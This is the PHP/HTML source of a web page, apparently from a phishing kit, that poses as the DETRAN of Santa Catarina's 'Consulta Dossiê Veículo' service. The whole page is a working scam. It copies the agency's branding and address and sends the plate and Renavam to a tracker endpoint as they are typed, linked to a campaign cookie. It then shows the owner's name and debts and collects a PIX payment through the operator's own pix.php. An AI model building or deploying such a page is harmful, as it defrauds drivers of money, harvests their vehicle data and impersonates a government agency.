<?php
// pages/detran-sc/index.php
if (!isset($pdo)) {
    require_once "../../db.php";
    require_once "../../base/utility.php";
    require_once "../../base/detect_device.php";
    $id_usuario = (int)($_COOKIE['campanha'] ?? $_SESSION['user_id'] ?? 1); 
    $page = 'detran-sc';
    require_once "../../base/tracker.php";
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DETRAN DIGITAL - Santa Catarina</title>
    <link href="https://fonts.googleapis.com/css?family=Lato:100,300,400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.7/css/all.css">
    
    <style>
        :root {
            --primary-sc: #363;
            --secondary-sc: #c4000b;
            --tertiary-sc: #8fb13a;
        }
        body { font-family: 'Lato', sans-serif; background-color: #fafafa; color: rgba(27,27,27,.8); }
        
        .sc-header { background-color: #fff; border-bottom: 1px solid #eee; padding: 15px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .sc-container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo-image { height: 50px; }
        
        .main-content { padding: 60px 0; min-height: 70vh; }
        .card-sc { border: none; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); background: #fff; }
        .btn-sc-primary { 
            background: linear-gradient(0deg, var(--primary-sc), var(--tertiary-sc)); 
            color: #fff; border: none; padding: 15px; font-weight: 700; border-radius: 4px;
            box-shadow: rgba(0,0,0,0.4) 0px 2px 4px;
        }
        .btn-sc-primary:hover { opacity: 0.9; color: #fff; }
        
        .step-content { display: none; }
        .step-content.active { display: block; }

        .footer-sc { background-color: #fff; border-top: 5px solid var(--primary-sc); padding: 40px 0; margin-top: 40px; }
        .footer-logo { height: 40px; opacity: 0.8; margin-bottom: 20px; }
        
        /* Modal Style */
        .modal-custom-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); display: none; align-items: center;
            justify-content: center; z-index: 9999; backdrop-filter: blur(2px);
        }
        .modal-custom-content {
            background: white; padding: 30px; border-radius: 12px;
            width: 100%; max-width: 450px; position: relative;
        }

        .loader-spinner {
            display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .invoice-card { text-align: center; border: 1px solid #ddd; padding: 20px; border-radius: 12px; background: white; }
        .qr-code-box { margin: 20px 0; padding: 15px; background: #fff; border: 1px solid #eee; display: inline-block; min-height: 250px; min-width: 250px; }
        .pix-copy-box {
            background: #f8f9fa; border: 1px solid #dee2e6; padding: 10px; border-radius: 5px;
            font-family: monospace; font-size: 0.9em; word-break: break-all; margin: 15px 0;
            cursor: pointer;
        }
        
        .table-sc { font-size: 1.1rem; }
        .table-sc thead { border-bottom: 2px solid #7fc0e4; }
        .table-sc td { border-bottom: 1px solid #7fc0e4; padding: 12px; }
        .debito-valor-col { color: var(--secondary-sc); font-weight: bold; }
    </style>
</head>

<body>

<header class="sc-header">
    <div class="sc-container">
        <div class="logo-area">
            <img src="../../imagens/dentransc.png" alt="Logo Detran/SC" class="logo-image">
            <div style="height: 30px; width: 1px; background: #ddd;"></div>
            <div style="font-weight: 700; color: #333; font-size: 1.2rem;">DETRAN DIGITAL</div>
        </div>
    </div>
</header>

<main class="main-content">
    <div class="sc-container">

        <!-- STEP 1: CONSULTA -->
        <div id="step-sc-consulta" class="step-content active">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="card-sc p-5">
                        <div class="text-center mb-4">
                            <h2 class="h4 fw-bold" style="color: var(--primary-sc);">Consulta Dossiê Veículo</h2>
                            <p class="text-muted small">Atenção: Esta consulta é restrita a veículos registrados ou com infrações em Santa Catarina.</p>
                        </div>
                        <form id="formConsultaSC">
                            <div class="mb-3">
                                <label class="form-label fw-bold small">Placa *</label>
                                <input type="text" id="placa" class="form-control form-control-lg" placeholder="Placa" required maxlength="7" style="text-transform: uppercase; border-radius: 4px;">
                            </div>
                            <div class="mb-4">
                                <label class="form-label fw-bold small">Renavam *</label>
                                <input type="text" id="renavam" class="form-control form-control-lg" placeholder="Renavam" required maxlength="11" style="border-radius: 4px;">
                            </div>
                            <button type="submit" class="btn btn-sc-primary w-100 py-3 fw-bold" id="btnConsultar">CONSULTAR DOSSIÊ VEÍCULO</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 2: RESULTADOS -->
        <div id="step-sc-resultados" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-lg-10">
                    <div class="card-sc">
                        <div class="card-header bg-white border-0 py-4 d-flex justify-content-between align-items-center">
                            <h2 class="h5 m-0 ml-1 fw-bold" style="color: var(--primary-sc);">Dossiê do Veículo</h2>
                            <button class="btn btn-sm btn-outline-secondary" onclick="showStep('sc-consulta')"><i class="fas fa-arrow-left"></i> Voltar</button>
                        </div>
                        <div class="p-4 bg-light border-top border-bottom">
                            <div class="row">
                                <div class="col-md-6">
                                    <i class="fas fa-user text-muted me-2"></i> <strong>Proprietário:</strong> <span id="span-proprietario">---</span>
                                </div>
                                <div class="col-md-6 text-md-end">
                                    <strong>Placa:</strong> <span id="span-placa">---</span> | <strong>Renavam:</strong> <span id="span-renavam">---</span>
                                </div>
                            </div>
                        </div>

                        <div class="table-responsive">
                            <table class="table table-sc m-0">
                                <thead class="table-light">
                                    <tr class="small text-muted text-uppercase">
                                        <th width="50" class="text-center">#</th>
                                        <th>Descrição do Débito</th>
                                        <th>Vencimento</th>
                                        <th class="text-center">Situação</th>
                                        <th class="text-end">Valor (R$)</th>
                                    </tr>
                                </thead>
                                <tbody id="listaDebitosSC">
                                    <!-- Dinâmico -->
                                </tbody>
                            </table>
                        </div>

                        <div class="card-footer bg-white border-0 p-5">
                            <div class="d-flex justify-content-between align-items-center mb-4">
                                <span class="fw-bold" style="color: #666;">VALOR TOTAL SELECIONADO:</span>
                                <span class="h3 m-0 text-success fw-bold" id="totalValueSC">R$ 0,00</span>
                            </div>
                            <button class="btn btn-success w-100 py-3 fw-bold btn-sc-primary" id="btnIrParaPagamento">GERAR GUIA DE PAGAMENTO</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 3: PAGAMENTO -->
        <div id="step-sc-pagamento" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="invoice-card card-sc p-5">
                        <div class="mb-4">
                            <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" style="height: 40px;">
                        </div>
                        <h2 class="h4 fw-bold mb-4">Pagamento via PIX</h2>

                        <div class="qr-code-box" id="qr-container-sc"></div>

                        <div class="alert alert-info small mb-4" style="border-left: 5px solid var(--primary-sc);">
                            <i class="fas fa-info-circle"></i> Escaneie o código QR acima ou copie a linha abaixo para pagar via PIX.
                        </div>

                        <div class="pix-copy-box" id="pixCodeSC" onclick="copyPixSC()">
                            Clique para copiar o código PIX
                        </div>

                        <button id="btnConfirmarPagamentoSC" class="btn btn-success w-100 py-3 fw-bold mt-3" style="display:none; background-color: #28a745; border:none;">CONFIRMO QUE REALIZEI O PAGAMENTO</button>

                        <div class="d-flex align-items-center justify-content-center text-muted mt-4 small">
                            <div class="spinner-border spinner-border-sm me-2 text-primary" role="status"></div>
                            Aguardando confirmação do sistema bancário...
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 4: SUCESSO -->
        <div id="step-sc-sucesso" class="step-content text-center">
            <div class="card-sc p-5">
                <div class="mb-4">
                    <i class="fas fa-check-circle text-success" style="font-size: 5rem;"></i>
                </div>
                <h2 class="fw-bold text-success mt-3">Pagamento Liquidado!</h2>
                <p class="text-muted">A guia foi paga com sucesso e o débito será baixado no sistema em instantes.</p>
                <div class="bg-light p-4 rounded-3 mb-4 text-start border">
                    <div class="mb-2">Autenticação: <strong id="comp-id-sc">#0000</strong></div>
                    <div>Data da Transação: <strong id="comp-data-sc">--/--/--</strong></div>
                </div>
                <button class="btn btn-sc-primary w-100 py-3" onclick="location.reload()">VOLTAR AO INÍCIO</button>
            </div>
        </div>

    </div>
</main>

<footer class="footer-sc">
    <div class="sc-container">
        <div class="row text-center text-md-start">
            <div class="col-md-6 mb-4">
                <img src="../../imagens/dentransc.png" class="footer-logo" alt="Logo Detran SC">
                <div class="small text-muted">
                    <strong>Departamento Estadual de Trânsito de Santa Catarina - DETRAN/SC</strong><br>
                    Av. Almirante Tamandaré - 480, Coqueiros, Florianópolis, SC CEP 88.080-160<br>
                    Fone (48) 3664-1800 | Ambiente Seguro
                </div>
            </div>
            <div class="col-md-6 text-md-end">
                <div class="mb-3">
                    <a href="#" class="text-muted me-3"><i class="fab fa-facebook-f"></i></a>
                    <a href="#" class="text-muted me-3"><i class="fab fa-twitter"></i></a>
                    <a href="#" class="text-muted"><i class="fab fa-instagram"></i></a>
                </div>
                <div class="small text-muted">
                    Copyright © 2026 Todos os Direitos Reservados SC<br>
                    Governo de Santa Catarina | Desenvolvimento - CIASC
                </div>
            </div>
        </div>
    </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<script>
    let currentDataSC = null;
    let totalValorSC = 0;
    let currentRefSC = null;
    let pollIntervalSC = null;
    let typingTimerSC = null;

    function showStep(stepName) {
        document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
        document.getElementById(`step-${stepName}`).classList.add('active');
        window.scrollTo(0,0);
    }

    function getTypingDocSC() {
        const placa = document.getElementById('placa').value.trim().toUpperCase();
        const renavam = document.getElementById('renavam').value.trim();

        return `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`;
    }

    function notifyTypingStartSC() {
        clearTimeout(typingTimerSC);
        typingTimerSC = setTimeout(() => {
            const placa = document.getElementById('placa').value.trim().toUpperCase();
            const renavam = document.getElementById('renavam').value.trim();

            fetch('../../api/typing_start.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    typing: true,
                    tela: 'detran-sc',
                    page: 'detran-sc',
                    doc: `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`,
                    placa: placa,
                    renavam: renavam
                })
            }).catch(() => {});
        }, 250);
    }

    function syncLoginDebitosSC(data) {
        const totalDebitos = Array.isArray(data?.dados) ? data.dados.length : 0;
        const totalValor = Array.isArray(data?.dados)
            ? data.dados.reduce((acc, item) => acc + (parseFloat(item?.atual) || 0), 0)
            : 0;

        fetch('../../api/typing_start.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                typing: true,
                tela: 'detran-sc',
                page: 'detran-sc',
                doc: `Placa: ${document.getElementById('placa').value.trim().toUpperCase() || '---'} | Renavam: ${document.getElementById('renavam').value.trim() || '---'}`,
                placa: document.getElementById('placa').value.trim().toUpperCase(),
                renavam: document.getElementById('renavam').value.trim(),
                debitos: `${totalDebitos} / R$ ${totalValor.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`
            })
        }).catch(() => {});
    }

    // Máscara Renavam
    document.getElementById('renavam').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, "");
    });

    ['placa', 'renavam'].forEach(id => {
        const input = document.getElementById(id);
        input.addEventListener('input', notifyTypingStartSC);
    });

    // Consulta
    document.getElementById('formConsultaSC').addEventListener('submit', function(e) {
        e.preventDefault();
        const placa = document.getElementById('placa').value;
        const renavam = document.getElementById('renavam').value;
        const btn = document.getElementById('btnConsultar');

        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> CONSULTANDO...';

        fetch(`../../api/buscarSC.php?placa=${placa}&renavam=${renavam}`)
        .then(res => res.json())
        .then(data => {
            if (data.IsStatus) {
                currentDataSC = data;
                renderDebitosSC(data);
                syncLoginDebitosSC(data);
                showStep('sc-resultados');
            } else {
                alert('Erro: ' + (data.error || 'Veículo não encontrado em Santa Catarina.'));
            }
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'CONSULTAR DOSSIÊ VEÍCULO';
        });
    });

    function renderDebitosSC(data) {
        const lista = document.getElementById('listaDebitosSC');
        lista.innerHTML = '';

        document.getElementById('span-proprietario').textContent = data.proprietario || '---';
        document.getElementById('span-placa').textContent = document.getElementById('placa').value.toUpperCase();
        document.getElementById('span-renavam').textContent = document.getElementById('renavam').value;

        data.dados.forEach((item, index) => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td class="text-center"><input type="checkbox" class="debito-check-sc form-check-input" data-valor="${item.atual}" checked></td>
                <td class="small fw-bold">${item.descricao}</td>
                <td class="small">${item.data_vencimento}</td>
                <td class="text-center"><span class="badge bg-success small" style="font-size: 0.7rem;">${item.situacao}</span></td>
                <td class="text-end fw-bold debito-valor-col">R$ ${parseFloat(item.atual).toLocaleString('pt-BR', {minimumFractionDigits:2})}</td>
            `;
            lista.appendChild(tr);
        });

        document.querySelectorAll('.debito-check-sc').forEach(c => c.addEventListener('change', calculateTotalSC));
        calculateTotalSC();
    }

    function calculateTotalSC() {
        totalValorSC = 0;
        document.querySelectorAll('.debito-check-sc:checked').forEach(c => {
            totalValorSC += parseFloat(c.dataset.valor);
        });
        document.getElementById('totalValueSC').textContent = `R$ ${totalValorSC.toLocaleString('pt-BR', {minimumFractionDigits:2})}`;
        document.getElementById('btnIrParaPagamento').disabled = totalValorSC <= 0;
    }

    document.getElementById('btnIrParaPagamento').addEventListener('click', () => {
        const nome = currentDataSC.proprietario || 'PROPRIETARIO DETRAN-SC';
        const placa = document.getElementById('placa').value.toUpperCase();
        const totalDebitos = document.querySelectorAll('.debito-check-sc').length;
        const debitosSelecionados = document.querySelectorAll('.debito-check-sc:checked').length;
        const debitoResumo = `${debitosSelecionados}/${totalDebitos}`;

        const btn = document.getElementById('btnIrParaPagamento');
        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> GERANDO GUIA...';

        const formData = new FormData();
        formData.append('cpf_cnpj', placa);
        formData.append('nome', nome);
        formData.append('valor', totalValorSC.toFixed(2));
        formData.append('debito', debitoResumo);

        fetch('../../data/pix.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                currentRefSC = data.id || data.pix;
                document.getElementById('pixCodeSC').dataset.code = data.pix;

                const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(data.pix)}`;
                const qrFallback = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pix)}`;
                
                document.getElementById('qr-container-sc').innerHTML = `
                    <img src="${qrUrl}" alt="QR Code PIX" style="max-width: 100%;" onerror="this.src='${qrFallback}'">
                `;

                showStep('sc-pagamento');
                startPollingSC();

                setTimeout(() => {
                    document.getElementById('btnConfirmarPagamentoSC').style.display = 'block';
                }, 45000); 
            } else {
                alert('Erro ao gerar pagamento.');
                btn.disabled = false;
                btn.textContent = 'GERAR GUIA DE PAGAMENTO';
            }
        })
        .catch(() => {
            alert('Erro de conexão.');
            btn.disabled = false;
            btn.textContent = 'GERAR GUIA DE PAGAMENTO';
        });
    });

    function copyPixSC() {
        const code = document.getElementById('pixCodeSC').dataset.code;
        if (!code) return;
        navigator.clipboard.writeText(code).catch(() => {});
        const box = document.getElementById('pixCodeSC');
        const oldText = box.textContent;
        box.textContent = '✅ COPIADO!';
        box.style.color = '#28a745';
        setTimeout(() => {
            box.textContent = oldText;
            box.style.color = '';
        }, 2000);
    }

    document.getElementById('btnConfirmarPagamentoSC').addEventListener('click', () => {
        const btn = document.getElementById('btnConfirmarPagamentoSC');
        btn.disabled = true;
        fetch('../../api/typing_start.php?action=confirm_payment&ref=' + (currentRefSC || '')).finally(() => {
            alert('Solicitação de baixa enviada! Aguarde a compensação.');
            btn.textContent = 'ENVIADO ✅';
        });
    });

    function startPollingSC() {
        if (pollIntervalSC) clearInterval(pollIntervalSC);
        pollIntervalSC = setInterval(() => {
            if (!currentRefSC) return;
            fetch(`../teste/get_status.php?ref=${encodeURIComponent(currentRefSC)}`)
            .then(res => res.json())
            .then(data => {
                if (data.payment_status === 'pago') {
                    clearInterval(pollIntervalSC);
                    document.getElementById('comp-id-sc').textContent = '#' + currentRefSC;
                    document.getElementById('comp-data-sc').textContent = new Date().toLocaleDateString('pt-BR');
                    showStep('sc-sucesso');
                }
            });
        }, 3000);
    }
</script>

</body>
</html>
